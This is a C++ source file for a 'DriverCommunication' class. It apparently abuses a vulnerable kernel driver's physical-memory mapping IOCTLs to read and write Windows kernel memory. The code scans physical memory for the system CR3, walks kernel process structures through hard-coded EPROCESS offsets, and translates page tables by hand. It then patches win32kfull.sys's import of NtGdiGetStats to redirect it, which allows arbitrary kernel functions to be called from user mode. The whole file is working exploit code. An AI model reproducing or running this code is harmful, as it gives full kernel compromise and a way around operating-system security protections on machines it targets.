#include "Driver.hpp"

#define UniqueProcessID 0x440
#define ActiveProcessLink 0x448
#define SectionBase 0x520
#define ImageFileName 0x5a8
#define VirtualSize 0x498

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

DriverCommunication::DriverCommunication() { }

bool DriverCommunication::Load(const wchar_t* DeviceName)
{
	LoadLibraryA("win32u.dll");
	LoadLibraryA("user32.dll");

	// Creating unicode string to open a device to our driver
	UNICODE_STRING UnicodeString;
	RtlInitUnicodeString(&UnicodeString, DeviceName);

	// Initilizing Classes To Pass To "NtCreateFile"
	OBJECT_ATTRIBUTES Attributes = OBJECT_ATTRIBUTES();
	IO_STATUS_BLOCK StatusBlock = IO_STATUS_BLOCK();

	// Creating Handle To The File
	Attributes.Length = sizeof(OBJECT_ATTRIBUTES);
	Attributes.ObjectName = &UnicodeString;

	bool Status = NT_SUCCESS(NtCreateFile(
		&this->DriverHandle,
		GENERIC_READ | GENERIC_WRITE | WRITE_DAC | SYNCHRONIZE,
		&Attributes,
		&StatusBlock,
		nullptr,
		NULL,
		FILE_SHARE_READ,
		FILE_OPEN,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
		nullptr,
		NULL
	));

	if (!Status) {
		return false;
	}

	this->Context = this->GetSystemCr3();

	if (!this->Context) {
		return false;
	}

	// Getting Explorer Cr3
	{
		std::uint64_t Process = this->GetProcess("explorer.exe");

		if (!Process) {
			return false;
		}

		this->ExplorerCr3 = this->GetCr3(Process);

		if (!this->ExplorerCr3) {
			return false;
		}
	}

	// Caching NtGdiColorCorrectPalette's Data Pointer and Usermode System Call
	std::uint64_t PreviousContext = this->Context;
	this->Context = this->ExplorerCr3;
	{
		this->FunctionToCall = (std::uint64_t)GetProcAddress(GetModuleHandleA("win32u.dll"), "NtGdiColorCorrectPalette");

		if (!this->FunctionToCall) {
			return false;
		}

		// Getting the method address
		std::uint64_t MethodAddress = this->GetSystemImage("win32k.sys") + 0x9b84;

		if (!MethodAddress) {
			return false;
		}

		// Adding the offset to the address
		MethodAddress += 4;

		// Reading the instruction
		int Instruction = NULL;
		this->ReadVirtualMemory(MethodAddress + 3, &Instruction, sizeof(int));

		if (!Instruction) {
			return false;
		}

		this->Function = MethodAddress + Instruction + 7;
	}
	this->Context = PreviousContext;

	// Caching ntoskrnl's export list
	{
		// Loading ntoskrnl
		HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");

		if (ntoskrnl == NULL) {
			return false;
		}

		// Get the export addresses
		IMAGE_DOS_HEADER* DosHeader = (IMAGE_DOS_HEADER*)ntoskrnl;
		IMAGE_NT_HEADERS* NtHeaders = (IMAGE_NT_HEADERS*)((BYTE*)ntoskrnl + DosHeader->e_lfanew);
		IMAGE_EXPORT_DIRECTORY* ExportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)ntoskrnl + NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		// Getting all the export data
		DWORD* FunctionList = (DWORD*)((BYTE*)ntoskrnl + ExportDirectory->AddressOfFunctions);
		DWORD* NameList = (DWORD*)((BYTE*)ntoskrnl + ExportDirectory->AddressOfNames);
		WORD* OrdinalList = (WORD*)((BYTE*)ntoskrnl + ExportDirectory->AddressOfNameOrdinals);

		// Cache export offsets
		for (DWORD i = 0; i < ExportDirectory->NumberOfNames; ++i) 
		{
			// Copying name to a new buffer
			char* ExportName = new char[64];
			memcpy(ExportName, (char*)((BYTE*)ntoskrnl + NameList[i]), 64);
			
			// inserting name and offset into a list
			this->ExportList.insert({ std::string(ExportName), FunctionList[OrdinalList[i]]});
		}

		// Unload the DLL
		FreeLibrary(ntoskrnl);
	}

	// Hooking win32kfull.sys import of NtGdiGetStats to point to memmove inside of win32kbase.sys
	{
		auto MemoryOperation = [&](const std::uint64_t VirtualAddress, void* Buffer, std::size_t Size, bool Read = true) -> bool
		{
			std::size_t Offset = NULL;
			std::size_t Value = Size;

			while (Value)
			{
				const std::uint64_t PhysicalAddress = this->CallKernelFunction<std::uint64_t>("MmGetPhysicalAddress", Offset + VirtualAddress);

				if (!PhysicalAddress) {
					return false;
				}

				const std::uint64_t Bytes = min(PAGE_SIZE - (PhysicalAddress & 0xFFF), Value);

				if (Read) {
					this->ReadPhysicalMemory(PhysicalAddress, (void*)((std::uint64_t)Buffer + Offset), Bytes);
				}
				else {
					this->WritePhysicalMemory(PhysicalAddress, (void*)((std::uint64_t)Buffer + Offset), Bytes);
				}

				Offset += Bytes;
				Value -= Bytes;
			}

			return true;
		};

		const std::uint64_t ImageBase = this->GetSystemImage("win32kfull.sys");

		if (!ImageBase) {
			return false;
		}

		IMAGE_DOS_HEADER DosHeader = { };
		MemoryOperation(ImageBase, &DosHeader, sizeof(IMAGE_DOS_HEADER));

		if (DosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
			return false;
		}

		IMAGE_NT_HEADERS NtHeader = { };
		MemoryOperation(ImageBase + DosHeader.e_lfanew, &NtHeader, sizeof(IMAGE_NT_HEADERS));

		if (NtHeader.Signature != IMAGE_NT_SIGNATURE) {
			return false;
		}

		std::uint64_t CurrentAddress = ImageBase + NtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
		IMAGE_IMPORT_DESCRIPTOR ImportDescriptor = { };
		MemoryOperation(CurrentAddress, &ImportDescriptor, sizeof(ImportDescriptor));

		while (ImportDescriptor.Name)
		{
			char ImageName[MAX_PATH];
			MemoryOperation(ImageBase + ImportDescriptor.Name, ImageName, MAX_PATH);

			if (!strcmp("win32kbase.sys", ImageName)) 
			{
				std::uint64_t OriginalFirstThunkAddress = ImageBase + ImportDescriptor.OriginalFirstThunk;
				IMAGE_THUNK_DATA OriginalFirstThunk = { };
				MemoryOperation(OriginalFirstThunkAddress, &OriginalFirstThunk, sizeof(IMAGE_THUNK_DATA));

				std::uint64_t FirstThunkAddress = ImageBase + ImportDescriptor.FirstThunk;
				IMAGE_THUNK_DATA FirstThunk = { };
				MemoryOperation(FirstThunkAddress, &FirstThunk, sizeof(IMAGE_THUNK_DATA));

				while (OriginalFirstThunk.u1.AddressOfData)
				{
					char ImportName[MAX_PATH];
					MemoryOperation(ImageBase + OriginalFirstThunk.u1.AddressOfData + sizeof(WORD), ImportName, MAX_PATH);

					if (!strcmp("NtGdiGetStats", ImportName))
					{
						FirstThunk.u1.Function = this->GetSystemImage("win32kbase.sys") + 0xD13C0;
						MemoryOperation(FirstThunkAddress, &FirstThunk, sizeof(IMAGE_THUNK_DATA), false);
						return true;
					}

					MemoryOperation(OriginalFirstThunkAddress += sizeof(IMAGE_THUNK_DATA), &OriginalFirstThunk, sizeof(IMAGE_THUNK_DATA));
					MemoryOperation(FirstThunkAddress += sizeof(IMAGE_THUNK_DATA), &FirstThunk, sizeof(IMAGE_THUNK_DATA));
				}
			}

			MemoryOperation(CurrentAddress += sizeof(IMAGE_IMPORT_DESCRIPTOR), &ImportDescriptor, sizeof(IMAGE_IMPORT_DESCRIPTOR));
		}
	}

	return false;
}

void DriverCommunication::Unload()
{
	CloseHandle(this->DriverHandle);
}

MemoryPage* DriverCommunication::GenerateMemoryPage()
{
	// Allocating the page
	std::uint64_t Page = this->CallKernelFunction<std::uint64_t>("MmAllocateNonCachedMemory", PAGE_SIZE);

	if (!Page) {
		return nullptr;
	}

	// Clearing the page data
	char Buffer[PAGE_SIZE];
	memset(Buffer, 0, PAGE_SIZE);
	this->WriteVirtualMemory(Page, Buffer, PAGE_SIZE);

	// Getting the pte address
	std::uint64_t Pte = this->GetPteAddress(Page);

	if (!Pte) {
		return nullptr;
	}

	return new MemoryPage(Page, Pte);
}

bool DriverCommunication::WriteVirtualMemory(std::uint64_t Address, void* Buffer, std::size_t Size)
{
	std::size_t Offset = NULL;
	std::size_t Value = Size;

	while (Value)
	{
		const std::uint64_t PhysicalAddress = this->GetPhysicalAddress(Offset + Address);

		if (!PhysicalAddress) {
			return false;
		}

		const std::uint64_t Bytes = min(PAGE_SIZE - (PhysicalAddress & 0xFFF), Value);

		this->WritePhysicalMemory(PhysicalAddress, (void*)((std::uint64_t)Buffer + Offset), Bytes);

		Offset += Bytes;
		Value -= Bytes;
	}

	return true;
}

bool DriverCommunication::ReadVirtualMemory(std::uint64_t Address, void* Buffer, std::size_t Size)
{
	std::size_t Offset = NULL;
	std::size_t Value = Size;

	while (Value)
	{
		const std::uint64_t PhysicalAddress = this->GetPhysicalAddress(Offset + Address);

		if (!PhysicalAddress) {
			if (Size == 260) {
				std::printf("Failed to read!\n");
			}
			return false;
		}

		const std::uint64_t Bytes = min(PAGE_SIZE - (PhysicalAddress & 0xFFF), Value);

		this->ReadPhysicalMemory(PhysicalAddress, (void*)((std::uint64_t)Buffer + Offset), Bytes);

		Offset += Bytes;
		Value -= Bytes;
	}

	return true;
}

void DriverCommunication::SetContext(const std::uint64_t Context)
{
	this->Context = Context;
}

std::uint64_t DriverCommunication::GetContext()
{
	return this->Context;
}

std::uint64_t DriverCommunication::GetSystemImage(const char* ImageName)
{
	// Intilizing Variables
	DWORD SizeInBytes = 0x00;
	void* Buffer = nullptr;

	// Getting Size Of List
	NTSTATUS Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)(11), Buffer, SizeInBytes, &SizeInBytes);

	// Attempting To Fix List
	while (Status == STATUS_INFO_LENGTH_MISMATCH)
	{
		// Freeing Old Buffer And Allocating New Buffer
		VirtualFree(Buffer, NULL, MEM_RELEASE);
		Buffer = VirtualAlloc(nullptr, SizeInBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		// Setting List Into New Buffer
		Status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)(11),
			Buffer,
			SizeInBytes,
			&SizeInBytes
		);
	}

	// Checking If It Failed To Assign List
	if (!NT_SUCCESS(Status))
	{
		VirtualFree(Buffer, NULL, MEM_RELEASE);
		return NULL;
	}

	// Reinterpreting The Buffer Into The List Struct
	const RTL_PROCESS_MODULES* List = (RTL_PROCESS_MODULES*)(Buffer);

	// Walking Module List
	for (unsigned long Index = 0; Index < List->NumberOfModules; ++Index)
	{
		// Getting The Current Module Name
		const char* EntryName = (char*)(List->Modules[Index].FullPathName) + List->Modules[Index].OffsetToFileName;

		// Checking If Current Module Is Target Module
		if (!strcmp(EntryName, ImageName)) 
		{
			// Getting Current Image Base
			const RTL_PROCESS_MODULE_INFORMATION Info = List->Modules[Index];

			// Freeing List
			VirtualFree(Buffer, NULL, MEM_RELEASE);

			return (std::uint64_t)Info.ImageBase;
		}
	}

	return NULL;
}

std::uint64_t DriverCommunication::GetCr3(const std::uint64_t Process)
{
	// Getting Cr3 from the process structure
	std::uint64_t Cr3 = NULL;
	this->ReadVirtualMemory(Process + 0x28, &Cr3, sizeof(std::uint64_t));

	return Cr3;
}

std::uint64_t DriverCommunication::GetProcess(const char* ProcessName)
{
	std::uint64_t SystemProcess = this->GetSystemProcess();

	if (!SystemProcess) {
		return NULL;
	}

	std::uint64_t LinkStart = SystemProcess + ActiveProcessLink;
	std::uint64_t Flink = LinkStart;

	while (Flink)
	{
		// Reading the forward link to the next process
		this->ReadVirtualMemory(Flink, &Flink, sizeof(std::uint64_t));

		// Calculating the process by removing the process link offset
		std::uint64_t EProcess = Flink - ActiveProcessLink;

		// Grabbing our local process
		if (ProcessName == nullptr)
		{
			DWORD Id = NULL;
			this->ReadVirtualMemory(EProcess + UniqueProcessID, &Id, sizeof(Id));

			if (Id == GetCurrentProcessId()) {
				return EProcess;
			}
		}

		// Getting the process by name
		else
		{
			// Reading the ImageFileName of the Process
			char Name[MAX_PATH];
			this->ReadVirtualMemory(EProcess + ImageFileName, Name, MAX_PATH);

			// Comparing image name to the one we want to see if it is the EProcess we want
			if (!strcmp(ProcessName, Name)) {
				return EProcess;
			}
		}

		// Reading the forward link to the next process
		this->ReadVirtualMemory(Flink, &Flink, sizeof(std::uint64_t));

	}

	return NULL;
}

std::uint64_t DriverCommunication::GetExportAddress(std::string Name)
{
	static std::uint64_t ntoskrnl = this->GetSystemImage("ntoskrnl.exe");

	if (!ntoskrnl) {
		return NULL;
	}

	auto Entry = this->ExportList.find(Name);

	if (Entry == this->ExportList.end()) {
		return NULL;
	}

	return ntoskrnl + Entry->second;
}

std::uint64_t DriverCommunication::GetSystemProcess()
{
	// Getting the size of the buffer
	std::uint32_t _Length = 0;
	std::uint8_t _Buffer[1024] = { 0 };
	NTSTATUS Status = NtQuerySystemInformation(
		static_cast<SYSTEM_INFORMATION_CLASS>(0x40), // SystemExtendedHandleInformation
		&_Buffer,
		sizeof(_Buffer),
		reinterpret_cast<ULONG*>(&_Length)
	);

	// Increasing the size of the buffer
	_Length += 50 * (sizeof(SYSTEM_HANDLE_INFORMATION_EX) + sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

	// Allocating a buffer with the new length and zeroing it
	void* Buffer = VirtualAlloc(nullptr, _Length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	RtlSecureZeroMemory(Buffer, _Length);

	// Getting the correct length of the buffer
	std::uint32_t Length = 0;
	Status = NtQuerySystemInformation(
		static_cast<SYSTEM_INFORMATION_CLASS>(0x40), // SystemExtendedHandleInformation
		Buffer,
		_Length,
		reinterpret_cast<ULONG*>(&Length)
	);

	// Reinterpreting our buffer into the HandleInformation structure
	SYSTEM_HANDLE_INFORMATION_EX* HandleInformation = reinterpret_cast<SYSTEM_HANDLE_INFORMATION_EX*>(Buffer);

	// Walking our handle table to find the handle of the system process
	for (std::uint32_t Index = 0; Index < HandleInformation->NumberOfHandles; Index++)
	{
		// Validating the handle attributes
		if (HandleInformation->Handles[Index].HandleAttributes != 0x102A) {
			continue;
		}

		// Validating the unique process id
		if (HandleInformation->Handles[Index].UniqueProcessId != 4) {
			continue;
		}
		
		// Getting the result
		std::uint64_t Result = (std::uint64_t)(HandleInformation->Handles[Index].Object);

		// Freeing the list
		VirtualFree(Buffer, NULL, MEM_RELEASE);

		return Result;
	}

	// Freeing the list
	VirtualFree(Buffer, NULL, MEM_RELEASE);

	return NULL;
}

std::uint64_t DriverCommunication::GetSystemCr3()
{
	for (int Index = 0; Index < 10; Index++)
	{
		// Mapping a buffer of kernel pages to our process
		_Packet Packet;
		Packet.PhysicalAddress = Index * 0x10000;
		Packet.Size = 0x10000;
		if (!this->MapPhysicalMemory(&Packet)) {
			continue;
		}

		// Validating the buffer address
		if (!Packet.BaseAddress) {
			continue;
		}

		// Storing our buffer
		std::uint64_t Buffer = (std::uint64_t)Packet.BaseAddress;

		// Looping the buffer for the system cr3
		for (int Offset = 0; Offset < 0x10000; Offset += 0x1000)
		{
			if (0x00000001000600E9 ^ (0xffffffffffff00ff & *reinterpret_cast<uintptr_t*>(Buffer + Offset)))
				continue;
			if (0xfffff80000000000 ^ (0xfffff80000000000 & *reinterpret_cast<uintptr_t*>(Buffer + Offset + 0x70)))
				continue;
			if (0xffffff0000000fff & *reinterpret_cast<uintptr_t*>(Buffer + Offset + 0xa0))
				continue;

			return *reinterpret_cast<uintptr_t*>(Buffer + Offset + 0xa0);
		}

		// Unmapping buffer
		this->UnmapPhysicalMemory(&Packet);
	}
}

bool DriverCommunication::WritePhysicalMemory(const std::uint64_t Address, void* Buffer, std::size_t Size)
{
	_Packet Packet;
	Packet.PhysicalAddress = Address;
	Packet.Size = Size;

	if (!this->MapPhysicalMemory(&Packet)) {
		return false;
	}

	// Reading the data from the virtual address
	memcpy(Packet.BaseAddress, (void*)Buffer, Size);

	if (!this->UnmapPhysicalMemory(&Packet)) {
		return false;
	}

	return true;
}

bool DriverCommunication::ReadPhysicalMemory(const std::uint64_t Address, void* Buffer, std::size_t Size)
{
	_Packet Packet;
	Packet.PhysicalAddress = Address;
	Packet.Size = Size;

	if (!this->MapPhysicalMemory(&Packet)) {
		return false;
	}

	// Reading the data from the virtual address
	memcpy((void*)Buffer, Packet.BaseAddress, Size);

	if (!this->UnmapPhysicalMemory(&Packet)) {
		return false;
	}

	return true;
}

std::uint64_t DriverCommunication::GetPhysicalAddress(const std::uint64_t VirtualAddress)
{
	std::uint64_t pml4;
	std::uint64_t pdpt;
	std::uint64_t pde;
	std::uint64_t pte;

	std::uint64_t Cr3 = this->Context;

	Cr3 &= ~0xf;

	if (!this->ReadPhysicalMemory(8 * ((VirtualAddress >> 39) & 0x1FF) + Cr3, &pml4, sizeof(std::uint64_t))) {
		return NULL;
	}

	if (!pml4) {
		return NULL;
	}

	if ((pml4 & 1) == 0) {
		return NULL;
	}

	if (!this->ReadPhysicalMemory((pml4 & 0xFFFFFFFFF000i64) + 8 * ((VirtualAddress >> 30) & 0x1FF), &pdpt, sizeof(std::uint64_t))) {
		return NULL;
	}

	if (!pdpt || (pdpt & 1) == 0) {
		return NULL;
	}

	if ((pdpt & 0x80u) != 0i64) {
		return (VirtualAddress & 0x3FFFFFFF) + (pdpt & 0xFFFFFFFFF000i64);
	}

	if (!this->ReadPhysicalMemory((pdpt & 0xFFFFFFFFF000i64) + 8 * ((VirtualAddress >> 21) & 0x1FF), &pde, sizeof(std::uint64_t))) {
		return NULL;
	}

	if (!pde || (pde & 1) == 0) {
		return NULL;
	}

	if ((pde & 0x80u) != 0i64) {
		return (VirtualAddress & 0x1FFFFF) + (pde & 0xFFFFFFFFF000i64);
	}

	if (!this->ReadPhysicalMemory((pde & 0xFFFFFFFFF000i64) + 8 * ((VirtualAddress >> 12) & 0x1FF), &pte, sizeof(std::uint64_t))) {
		return NULL;
	}

	if (pte && (pte & 1) != 0) {
		return (VirtualAddress & 0xFFF) + (pte & 0xFFFFFFFFF000i64);
	}

	return NULL;
}

bool DriverCommunication::UnmapPhysicalMemory(_Packet* Packet)
{
	IO_STATUS_BLOCK StatusBlock = IO_STATUS_BLOCK();
	return NT_SUCCESS(NtDeviceIoControlFile(
		this->DriverHandle,
		(HANDLE)NULL,
		(PIO_APC_ROUTINE)nullptr,
		(PVOID)nullptr,
		(PIO_STATUS_BLOCK)&StatusBlock,
		(ULONG)0x80102044,
		(PVOID)Packet,
		(ULONG)sizeof(_Packet),
		(PVOID)Packet,
		(ULONG)sizeof(_Packet)
	));
}

bool DriverCommunication::MapPhysicalMemory(_Packet* Packet)
{
	IO_STATUS_BLOCK StatusBlock = IO_STATUS_BLOCK();
	return NT_SUCCESS(NtDeviceIoControlFile(
		this->DriverHandle,
		(HANDLE)NULL,
		(PIO_APC_ROUTINE)nullptr,
		(PVOID)nullptr,
		(PIO_STATUS_BLOCK)&StatusBlock,
		(ULONG)0x80102040,
		(PVOID)Packet,
		(ULONG)sizeof(_Packet),
		(PVOID)Packet,
		(ULONG)sizeof(_Packet)
	));
}
